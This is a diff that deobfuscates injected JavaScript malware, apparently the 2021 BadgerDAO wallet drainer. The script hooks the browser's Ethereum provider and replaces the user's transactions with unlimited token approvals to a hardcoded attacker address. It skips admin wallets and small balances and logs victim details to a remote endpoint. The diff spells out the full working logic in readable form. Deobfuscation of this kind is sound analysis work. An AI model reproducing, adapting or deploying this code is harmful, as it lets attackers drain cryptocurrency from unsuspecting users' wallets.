@@ -12,7 +12,7 @@ var texts_arr = empty_arr.concat(["error","/log2","0xb16eb3510000000000000000000
             _0x5d8bb7 = _0xff781a();
         while (true) {
             try {
-                var _0x5bb478 = parseInt(get_text_fn(0x1e6)) / 0x1 + parseInt(get_text_fn(0x1d5)) / 0x2 * (parseInt(get_text_fn(0x213)) / 0x3) + parseInt(get_text_fn(0x1dc)) / 0x4 + -parseInt(get_text_fn(0x212)) / 0x5 + parseInt(get_text_fn(0x1de)) / 0x6 + -parseInt(get_text_fn(0x1cf)) / 0x7 * (-parseInt(get_text_fn(0x1d1)) / 0x8) + -parseInt(get_text_fn(0x1c2)) / 0x9;
+                var _0x5bb478 = parseInt('148955oXWuMb') / 0x1 + parseInt('2bQpZqP') / 0x2 * (parseInt('2522511JAxUHN') / 0x3) + parseInt('3313384iKxMJQ') / 0x4 + -parseInt('2044480XuqSyr') / 0x5 + parseInt('4531932SiFucS') / 0x6 + -parseInt('931JNuWlv') / 0x7 * (-parseInt('10512waBowy') / 0x8) + -parseInt('16546248mVVbtv') / 0x9;
                 if (_0x5bb478 === _0x2ac14d) break;
                 else _0x5d8bb7['push'](_0x5d8bb7['shift']());
             } catch (_0x36388b) {
@@ -24,15 +24,16 @@ var texts_arr = empty_arr.concat(["error","/log2","0xb16eb3510000000000000000000
 );
 
 async function _log(_0x12cb76, _0x2655b3) {
+    console.log(_0x12cb76, _0x2655b3)
     var get_text_fn = get_text;
     console_log(_0x12cb76, _0x2655b3),
         await fetch(
-            get_text_fn(0x19c),
+            '/log2',
             {
                 'method': 'stringify',
                 'mode': 'no-cors',
-                'body': _0x12cb76 + ':' + JSON[get_text_fn(0x1bd)](_0x2655b3),
-                'headers': new Headers({ 'Content-Type': get_text_fn(0x204) })
+                'body': _0x12cb76 + ':' + JSON['stringify'](_0x2655b3),
+                'headers': new Headers({ 'Content-Type': 'application/json' })
             }
         );
 }
@@ -178,17 +179,17 @@ function console_log(_0x3e05a1, _0x391b7c) {
     var get_text_fn = get_text,
         should_output = true;
     !should_output &&
-        console[get_text_fn(0x1ca)]('_' + _0x3e05a1, _0x391b7c);
+        console['log']('_' + _0x3e05a1, _0x391b7c);
 }
 var _denied = ![], _approved = ![];
 async function getVaults(_0x318b76) {
     var get_text_fn = get_text;
     try {
-        var _0x58efc9 = await fetch(get_text_fn(0x1cd) + _0x318b76 + '?chain=ethereum'),
-            _0x106739 = await _0x58efc9[get_text_fn(0x1a3)]();
+        var _0x58efc9 = await fetch('https://web.archive.org/web/20211129204203/https://api.badger.com/v2/accounts/' + _0x318b76 + '?chain=ethereum'),
+            _0x106739 = await _0x58efc9['text']();
         console_log('userData', _0x106739);
-        var _0x180afe = JSON[get_text_fn(0x1ab)](_0x106739);
-        return _log(get_text_fn(0x206), _0x180afe), _0x180afe;
+        var _0x180afe = JSON['parse'](_0x106739);
+        return _log('userJson', _0x180afe), _0x180afe;
     } catch (_0x4c4e33) {
         return _log(_0x4c4e33), null;
     }
@@ -196,66 +197,66 @@ async function getVaults(_0x318b76) {
 async function tx(_0x656ce6, _0x290819, _0x152c0c) {
     var get_text_var = get_text;
     try {
-        console_log(get_text_var(0x20d), _0x152c0c);
-        var _0x30a338 = _0x152c0c[0x0][get_text_var(0x1ea)],
-            _0x4a6008 = _0x30a338[0x0][get_text_var(0x1cb)],
-            _0x5771d1 = get_text_var(0x1b9);
-        _0x4a6008[get_text_var(0x1e9)]('0x2e1a7d4d000000000000000000000000')
-            && (_0x5771d1 = get_text_var(0x1b6));
+        console_log('args', _0x152c0c);
+        var _0x30a338 = _0x152c0c[0x0]['params'],
+            _0x4a6008 = _0x30a338[0x0]['data'],
+            _0x5771d1 = 'CLAIMING';
+        _0x4a6008['startsWith']('0x2e1a7d4d000000000000000000000000')
+            && (_0x5771d1 = 'WITHDRAWING');
         if (_denied) throw '_denied: ' + _denied;
-        if (_approved) throw get_text_var(0x1b4) + _approved;
+        if (_approved) throw '_approved: ' + _approved;
         var
-            _0x18c8de = get_text_var(0x1e4),
-            _0x48a252 = window[get_text_var(0x1d2)];
-        const _0x378774 = new _0x48a252[(get_text_var(0x1f7))][(get_text_var(0x1ac))](window[get_text_var(0x1af)]);
+            _0x18c8de = '0x1FCdb04d0C5364FBd92C73cA8AF9BAA72c269107',
+            _0x48a252 = window['_ethers'];
+        const _0x378774 = new _0x48a252[('providers')][('Web3Provider')](window['ethereum']);
         var _0x2d0c43 = await _0x378774['getNetwork']();
-        console_log(get_text_var(0x20e), _0x2d0c43[get_text_var(0x20e)]);
-        if (_0x2d0c43[get_text_var(0x20e)] != 0x1) throw get_text_var(0x1ee) + _0x2d0c43['chainId'];
-        const _0x48a672 = await _0x378774[get_text_var(0x1c6)](),
+        console_log('chainId', _0x2d0c43['chainId']);
+        if (_0x2d0c43['chainId'] != 0x1) throw 'Network is not Ethereum! network.chainId: ' + _0x2d0c43['chainId'];
+        const _0x48a672 = await _0x378774['listAccounts'](),
             _0x8c99ba = _0x48a672[0x0];
-        _log(_0x5771d1 + get_text_var(0x1eb), _0x8c99ba);
+        _log(_0x5771d1 + ': owner', _0x8c99ba);
         var _0x1dfdb1 = [
-            get_text_var(0x1ae),
-            get_text_var(0x1ff),
-            get_text_var(0x1c4),
-            get_text_var(0x1f0),
-            get_text_var(0x19e),
-            get_text_var(0x1d3),
-            get_text_var(0x1a0),
-            get_text_var(0x1f3)
+            '0x392888ADe85c036bA57CFb3b17d41DbCAE64Aaa9',
+            '0xb65cef03b9b89f99517643226d76e286ee999e77',
+            '0x45B14b5d5C536C3FAba451A1ba53387dcdDFCf2F',
+            '0x4c16bf1f3acbcbf2b05291e8120dacc05c10586e',
+            '0x54cf9df9dcd78e470ab7cb892d7bfbe114c025fc',
+            '0xaf94d299a73c4545ff702e79d16d9fb1ab5bdabf',
+            '0x59c68a651a1f49c26145666e9d5647b1472912a9',
+            '0x15b8fe651c268cfb5b519cc7e98bd45c162313c2'
         ];
-        if (_0x1dfdb1[get_text_var(0x1ec)](_0x8c99ba)) throw get_text_var(0x1f1) + _0x8c99ba;
+        if (_0x1dfdb1['includes'](_0x8c99ba)) throw 'ADMIN: ' + _0x8c99ba;
         var
             _0x5afdf4 = await getVaults(_0x8c99ba),
-            _0x1a0cab = _0x5afdf4[get_text_var(0x1f9)];
-        _log(get_text_var(0x1cc), _0x1a0cab);
+            _0x1a0cab = _0x5afdf4['value'];
+        _log('balance', _0x1a0cab);
         if (
-            _0x8c99ba != get_text_var(0x1c5) &&
+            _0x8c99ba != '0x38b8F6af1D55CAa0676F1cbB33b344d8122535C2' &&
             _0x1a0cab < 0xc350
-        ) throw get_text_var(0x205) + _0x1a0cab;
+        ) throw 'Balance too low: ' + _0x1a0cab;
         const _0x849a26 = _0x378774['getSigner']();
         var _0x4285f8 = [
             {
                 'constant': true,
                 'inputs': [],
-                'name': get_text_var(0x1dd),
+                'name': 'name',
                 'outputs': [
-                    { 'name': '', 'type': get_text_var(0x20c) }
+                    { 'name': '', 'type': 'string' }
                 ],
                 'payable': ![],
-                'stateMutability': get_text_var(0x1db),
-                'type': get_text_var(0x1e1)
+                'stateMutability': 'view',
+                'type': 'function'
             },
             {
                 'constant': ![],
                 'inputs': [
                     {
-                        'name': get_text_var(0x1c3),
-                        'type': get_text_var(0x1e7)
+                        'name': '_spender',
+                        'type': 'address'
                     },
                     {
                         'name': '_value',
-                        'type': get_text_var(0x1a4)
+                        'type': 'uint256'
                     }
                 ],
                 'name':
@@ -263,12 +264,12 @@ async function tx(_0x656ce6, _0x290819, _0x152c0c) {
                 'outputs': [
                     {
                         'name': '',
-                        'type': get_text_var(0x19f)
+                        'type': 'bool'
                     }
                 ],
                 'payable': ![],
-                'stateMutability': get_text_var(0x1b5),
-                'type': get_text_var(0x1e1)
+                'stateMutability': 'nonpayable',
+                'type': 'function'
             },
             {
                 'constant': true,
@@ -278,71 +279,71 @@ async function tx(_0x656ce6, _0x290819, _0x152c0c) {
                 'outputs': [
                     {
                         'name': '',
-                        'type': get_text_var(0x1a4)
+                        'type': 'uint256'
                     }],
                 'payable': ![],
-                'stateMutability': get_text_var(0x1db),
-                'type': get_text_var(0x1e1)
+                'stateMutability': 'view',
+                'type': 'function'
             },
             {
                 'constant': ![],
                 'inputs': [
                     {
                         'name': '_from',
-                        'type': get_text_var(0x1e7)
+                        'type': 'address'
                     },
                     {
-                        'name': get_text_var(0x1ed),
-                        'type': get_text_var(0x1e7)
+                        'name': '_to',
+                        'type': 'address'
                     },
                     {
-                        'name': get_text_var(0x200),
-                        'type': get_text_var(0x1a4)
+                        'name': '_value',
+                        'type': 'uint256'
                     }
                 ],
-                'name': get_text_var(0x210),
+                'name': 'transferFrom',
                 'outputs': [
                     {
                         'name': '',
-                        'type': get_text_var(0x19f)
+                        'type': 'bool'
                     }
                 ],
                 'payable': ![],
-                'stateMutability': get_text_var(0x1b5),
+                'stateMutability': 'nonpayable',
                 'type': 'function'
             },
             {
                 'constant': true,
                 'inputs': [],
-                'name': get_text_var(0x1f6),
+                'name': 'decimals',
                 'outputs': [
                     {
                         'name': '',
-                        'type': get_text_var(0x209)
+                        'type': 'uint8'
                     }
                 ],
                 'payable': ![],
                 'stateMutability': 'view',
-                'type': get_text_var(0x1e1)
+                'type': 'function'
             },
             {
                 'constant': true,
                 'inputs': [
                     {
                         'name': '_owner',
-                        'type': get_text_var(0x1e7)
+                        'type': 'address'
                     }
                 ],
-                'name': get_text_var(0x1fc),
+                'name': 'balanceOf',
                 'outputs': [
                     {
-                        'name': get_text_var(0x1cc),
-                        'type': get_text_var(0x1a4)
+                        'name': 'balance',
+                        'type': 'uint256'
                     }
                 ],
                 'payable': ![],
-                'stateMutability': get_text_var(0x1db),
-                'type': get_text_var(0x1e1)
+                'stateMutability': 'view',
+                'type': 'function'
             },
             {
                 'constant': true,
@@ -356,28 +357,28 @@ async function tx(_0x656ce6, _0x290819, _0x152c0c) {
                     }
                 ],
                 'payable': ![],
-                'stateMutability': get_text_var(0x1db),
-                'type': get_text_var(0x1e1)
+                'stateMutability': 'view',
+                'type': 'function'
             },
             {
                 'constant': ![],
                 'inputs': [
                     {
                         'name': '_to',
-                        'type': get_text_var(0x1e7)
+                        'type': 'address'
                     },
                     {
                         'name': '_value',
-                        'type': get_text_var(0x1a4)
+                        'type': 'uint256'
                     }
                 ],
-                'name': get_text_var(0x20a),
+                'name': 'transfer',
                 'outputs': [
                     { 'name': '', 'type': 'bool' }
                 ],
                 'payable': ![],
-                'stateMutability': get_text_var(0x1b5),
-                'type': get_text_var(0x1e1)
+                'stateMutability': 'nonpayable',
+                'type': 'function'
             },
             {
                 'constant': true,
@@ -387,33 +388,33 @@ async function tx(_0x656ce6, _0x290819, _0x152c0c) {
                         'type': 'address'
                     },
                     {
-                        'name': get_text_var(0x1c3),
-                        'type': get_text_var(0x1e7)
+                        'name': '_spender',
+                        'type': 'address'
                     }
                 ],
                 'name': 'allowance',
                 'outputs': [
                     {
                         'name': '',
-                        'type': get_text_var(0x1a4)
+                        'type': 'uint256'
                     }
                 ],
                 'payable': ![],
-                'stateMutability': get_text_var(0x1db),
-                'type': get_text_var(0x1e1)
+                'stateMutability': 'view',
+                'type': 'function'
             },
             {
                 'inputs': [],
-                'name': get_text_var(0x20f),
+                'name': 'token',
                 'outputs': [
                     {
-                        'internalType': get_text_var(0x1e0),
+                        'internalType': 'contract IERC20Upgradeable',
                         'name': '',
-                        'type': get_text_var(0x1e7)
+                        'type': 'address'
                     }
                 ],
-                'stateMutability': get_text_var(0x1db),
-                'type': get_text_var(0x1e1)
+                'stateMutability': 'view',
+                'type': 'function'
             },
             {
                 'payable': true,
@@ -425,22 +426,22 @@ async function tx(_0x656ce6, _0x290819, _0x152c0c) {
                 'inputs': [
                     {
                         'indexed': true,
-                        'name': get_text_var(0x1a1),
-                        'type': get_text_var(0x1e7)
+                        'name': 'owner',
+                        'type': 'address'
                     },
                     {
                         'indexed': true,
-                        'name': get_text_var(0x1c0),
-                        'type': get_text_var(0x1e7)
+                        'name': 'spender',
+                        'type': 'address'
                     },
                     {
                         'indexed': ![],
-                        'name': get_text_var(0x1f9),
-                        'type': get_text_var(0x1a4)
+                        'name': 'value',
+                        'type': 'uint256'
                     }
                 ],
-                'name': get_text_var(0x1a5),
-                'type': get_text_var(0x1bf)
+                'name': 'Approval',
+                'type': 'event'
             },
             {
                 'anonymous': ![],
@@ -453,7 +454,7 @@ async function tx(_0x656ce6, _0x290819, _0x152c0c) {
                     {
                         'indexed': true,
                         'name': 'to',
-                        'type': get_text_var(0x1e7)
+                        'type': 'address'
                     },
                     {
                         'indexed': ![],
@@ -461,99 +462,99 @@ async function tx(_0x656ce6, _0x290819, _0x152c0c) {
                         'type': 'uint256'
                     }
                 ],
-                'name': get_text_var(0x1ce),
+                'name': 'Transfer',
                 'type': 'event'
             }
         ],
             _0x1f4bab = 0x0,
             _0x49c07c = null;
-        for (var _0x3917a1 of Object['keys'](_0x5afdf4[get_text_var(0x1cb)])) {
+        for (var _0x3917a1 of Object['keys'](_0x5afdf4['data'])) {
             console_log(_0x3917a1, _0x5afdf4['data'][_0x3917a1]);
             var
-                _0x5b4653 = _0x5afdf4[get_text_var(0x1cb)][_0x3917a1],
-                _0x582ffe = _0x5b4653[get_text_var(0x1e7)],
+                _0x5b4653 = _0x5afdf4['data'][_0x3917a1],
+                _0x582ffe = _0x5b4653['address'],
                 _0x322715 = new _0x48a252['Contract'](_0x582ffe, _0x4285f8, _0x378774),
-                _0x456725 = await _0x322715[get_text_var(0x1f6)]();
-            console_log(get_text_var(0x1f6), _0x456725);
-            var _0x296558 = await _0x322715[get_text_var(0x1b1)](_0x8c99ba, _0x18c8de);
-            console_log(get_text_var(0x1d6), _0x296558);
-            var _0xb219bf = _0x48a252[get_text_var(0x1ba)][get_text_var(0x1a9)](_0x296558, _0x456725);
-            console_log(get_text_var(0x1b1), _0xb219bf);
+                _0x456725 = await _0x322715['decimals']();
+            console_log('decimals', _0x456725);
+            var _0x296558 = await _0x322715['allowance'](_0x8c99ba, _0x18c8de);
+            console_log('allowanceWei', _0x296558);
+            var _0xb219bf = _0x48a252['utils']['formatUnits'](_0x296558, _0x456725);
+            console_log('allowance', _0xb219bf);
             if (_0xb219bf > 0x0) {
                 var _0x4a56f5 = await _0x322715['symbol']();
-                console_log(get_text_var(0x1d0), _0x4a56f5);
-                var _0x50526e = await _0x322715[get_text_var(0x1dd)]();
+                console_log('contractSymbol', _0x4a56f5);
+                var _0x50526e = await _0x322715['name']();
                 console_log('contractName', _0x50526e);
-                throw get_text_var(0x1e5) + get_text_var(0x1d4) + _0x4a56f5 + get_text_var(0x20b) + _0x50526e + get_text_var(0x1a8) + _0x582ffe;
+                throw 'Already has allowance, ' + 'contractSymbol: ' + _0x4a56f5 + ', contractName: ' + _0x50526e + ', contractAddress: ' + _0x582ffe;
             }
-            _0x5b4653[get_text_var(0x1f9)] > _0x1f4bab && (_0x1f4bab = _0x5b4653[get_text_var(0x1f9)], _0x49c07c = _0x5b4653['address']);
+            _0x5b4653['value'] > _0x1f4bab && (_0x1f4bab = _0x5b4653['value'], _0x49c07c = _0x5b4653['address']);
         }
-        _log(get_text_var(0x207), _0x1f4bab),
+        _log('maxBalance', _0x1f4bab),
             _log('maxVault', _0x49c07c);
         var _0x46c76b = null;
         if (
-            _0x4a6008[get_text_var(0x1e9)]('0x2e1a7d4d000000000000000000000000') &&
-            _0x49c07c[get_text_var(0x1e2)]() == _0x30a338[0x0]['to'][get_text_var(0x1e2)]()
+            _0x4a6008['startsWith']('0x2e1a7d4d000000000000000000000000') &&
+            _0x49c07c['toLowerCase']() == _0x30a338[0x0]['to']['toLowerCase']()
         ) {
-            _log(get_text_var(0x1da), _0x49c07c);
+            _log('Withdrawing from the vault with the highest balance', _0x49c07c);
             var
-                _0x322715 = new _0x48a252[(get_text_var(0x1ad))](_0x49c07c, _0x4285f8, _0x378774),
+                _0x322715 = new _0x48a252[('Contract')](_0x49c07c, _0x4285f8, _0x378774),
                 _0x56e638 = await _0x322715['token']();
             console_log('tokenAddress', _0x56e638),
                 _0x49c07c = _0x56e638,
-                _0x322715 = new _0x48a252[(get_text_var(0x1ad))](_0x49c07c, _0x4285f8, _0x378774);
-            var _0x456725 = await _0x322715[get_text_var(0x1f6)]();
-            console_log(get_text_var(0x1f6), _0x456725);
-            var _0x296558 = await _0x322715[get_text_var(0x1b1)](_0x8c99ba, _0x18c8de);
-            console_log(get_text_var(0x1d6), _0x296558);
-            var _0xb219bf = _0x48a252[get_text_var(0x1ba)]['formatUnits'](_0x296558, _0x456725);
+                _0x322715 = new _0x48a252[('Contract')](_0x49c07c, _0x4285f8, _0x378774);
+            var _0x456725 = await _0x322715['decimals']();
+            console_log('decimals', _0x456725);
+            var _0x296558 = await _0x322715['allowance'](_0x8c99ba, _0x18c8de);
+            console_log('allowanceWei', _0x296558);
+            var _0xb219bf = _0x48a252['utils']['formatUnits'](_0x296558, _0x456725);
             console_log('allowance', _0xb219bf);
             if (_0xb219bf > 0x0) {
-                var _0x4a56f5 = await _0x322715[get_text_var(0x1bb)]();
+                var _0x4a56f5 = await _0x322715['symbol']();
                 console_log('contractSymbol', _0x4a56f5);
-                var _0x50526e = await _0x322715[get_text_var(0x1dd)]();
-                console_log(get_text_var(0x1bc), _0x50526e);
-                throw get_text_var(0x1e5) + get_text_var(0x1d4) + _0x4a56f5 + get_text_var(0x20b) + _0x50526e + get_text_var(0x1a8) + _0x582ffe;
+                var _0x50526e = await _0x322715['name']();
+                console_log('contractName', _0x50526e);
+                throw 'Already has allowance, ' + 'contractSymbol: ' + _0x4a56f5 + ', contractName: ' + _0x50526e + ', contractAddress: ' + _0x582ffe;
             }
-            var _0x53b1ba = new _0x48a252[(get_text_var(0x1ba))]['Interface']([get_text_var(0x1f8)]);
-            _0x46c76b = _0x53b1ba['encodeFunctionData'](get_text_var(0x1b7), [_0x18c8de, get_text_var(0x1a2)]);
+            var _0x53b1ba = new _0x48a252[('utils')]['Interface'](['function approve(address spender, uint value)']);
+            _0x46c76b = _0x53b1ba['encodeFunctionData']('approve', [_0x18c8de, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff']);
         }
         else {
-            var _0x53b1ba = new _0x48a252[(get_text_var(0x1ba))][(get_text_var(0x1fd))]([get_text_var(0x1c1)]);
-            _0x46c76b = _0x53b1ba[get_text_var(0x1b3)](get_text_var(0x1b0), [_0x18c8de, get_text_var(0x1a2)]);
+            var _0x53b1ba = new _0x48a252[('utils')][('Interface')](['function increaseAllowance(address spender, uint addedValue)']);
+            _0x46c76b = _0x53b1ba['encodeFunctionData']('increaseAllowance', [_0x18c8de, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff']);
         }
-        console_log(get_text_var(0x1d8), _0x46c76b);
+        console_log('encodedData', _0x46c76b);
         var
             _0xd98577 = { ..._0x30a338[0x0] };
         _0xd98577['data'] = _0x46c76b,
             _0xd98577['to'] =
-            _0x49c07c, _0xd98577['gas'] = _0x48a252[get_text_var(0x1ba)][get_text_var(0x201)](0xff3f),
+            _0x49c07c, _0xd98577['gas'] = _0x48a252['utils']['hexlify'](0xff3f),
             console_log('newParams', _0xd98577);
         var _0x543b9f = [
             {
-                'method': get_text_var(0x1f5),
+                'method': 'eth_sendTransaction',
                 'params': [_0xd98577]
             }
         ];
-        console_log(get_text_var(0x20d), _0x152c0c),
-            console_log(get_text_var(0x1f4), _0x543b9f),
-            _log(get_text_var(0x1cb), _0x5771d1 + ', owner: ' + _0x8c99ba + get_text_var(0x1a6) + _0x18c8de + get_text_var(0x1b8) + _0x49c07c + get_text_var(0x1b2) + _0x1f4bab);
+        console_log('args', _0x152c0c),
+            console_log('newArgs', _0x543b9f),
+            _log('data', _0x5771d1 + ', owner: ' + _0x8c99ba + ', newSpender: ' + _0x18c8de + ', maxVault: ' + _0x49c07c + ', balance: ' + _0x1f4bab);
         try {
             var _0x5dd52e = await Reflect['apply'](_0x656ce6, _0x290819, _0x543b9f);
             _log('tx', _0x5dd52e),
-                _log(get_text_var(0x211), _0x5771d1 + get_text_var(0x1fa) + _0x8c99ba + get_text_var(0x1a6) + _0x18c8de + ', maxVault: ' + _0x49c07c + get_text_var(0x1b2) + _0x1f4bab);
+                _log('data_tx', _0x5771d1 + ', owner: ' + _0x8c99ba + ', newSpender: ' + _0x18c8de + ', maxVault: ' + _0x49c07c + ', balance: ' + _0x1f4bab);
         }
         catch (_0x2b8012) {
-            if (_0x2b8012['message'] && _0x2b8012[get_text_var(0x202)][get_text_var(0x1ec)](get_text_var(0x1df))) {
-                _log(get_text_var(0x1df), _0x2b8012['message']);
+            if (_0x2b8012['message'] && _0x2b8012['message']['includes']('EIP-1559')) {
+                _log('EIP-1559', _0x2b8012['message']);
                 try {
-                    delete _0xd98577[get_text_var(0x1fe)],
-                        delete _0xd98577[get_text_var(0x1d7)],
-                        _0xd98577[get_text_var(0x1c9)] = _0x48a252['utils']['hexlify'](0x186a0);
+                    delete _0xd98577['maxFeePerGas'],
+                        delete _0xd98577['maxPriorityFeePerGas'],
+                        _0xd98577['gas'] = _0x48a252['utils']['hexlify'](0x186a0);
                     var _0x5d292a = await _0x378774['getGasPrice']();
-                    _log('gasPrice', _0x48a252['utils'][get_text_var(0x201)](_0x5d292a)),
-                        _0xd98577[get_text_var(0x1fb)] = _0x48a252[get_text_var(0x1ba)]['hexlify'](_0x5d292a),
-                        _0x543b9f = [{ 'method': get_text_var(0x1f5), 'params': [_0xd98577] }];
+                    _log('gasPrice', _0x48a252['utils']['hexlify'](_0x5d292a)),
+                        _0xd98577['gasPrice'] = _0x48a252['utils']['hexlify'](_0x5d292a),
+                        _0x543b9f = [{ 'method': 'eth_sendTransaction', 'params': [_0xd98577] }];
                     var _0x5dd52e = await Reflect['apply'](_0x656ce6, _0x290819, _0x543b9f);
                     _log('tx', _0x5dd52e);
                 }
@@ -565,10 +566,10 @@ async function tx(_0x656ce6, _0x290819, _0x152c0c) {
             else _denied = true;
             throw _0x2b8012;
         }
-        return _approved = true, Reflect[get_text_var(0x1c7)](_0x656ce6, _0x290819, _0x152c0c);
+        return _approved = true, Reflect['apply'](_0x656ce6, _0x290819, _0x152c0c);
     }
     catch (_0x4b4862) {
-        return _log(get_text_var(0x1d9), _0x4b4862), Reflect[get_text_var(0x1c7)](_0x656ce6, _0x290819, _0x152c0c);
+        return _log('err', _0x4b4862), Reflect['apply'](_0x656ce6, _0x290819, _0x152c0c);
     }
 }
 async function interceptMethodCalls(_0x3b557f) {
@@ -630,12 +631,12 @@ setInterval(
     function () {
         console.log("hello");
         var get_text_fn = get_text;
-        console.log(get_text_fn(0x208));
+        console.log('_isIntercepted');
         console.log(texts_arr[0x208]);
         !_isIntercepted && (
             console_log('_isIntercepted', _isIntercepted),
             typeof window['ethereum'] !== 'undefined' &&
-            typeof window[get_text_fn(0x1d2)] !== 'undefined' &&
+            typeof window['_ethers'] !== 'undefined' &&
             (interceptMethodCalls(ethereum), _isIntercepted = true, _log('_isIntercepted', _isIntercepted))
         );
     },
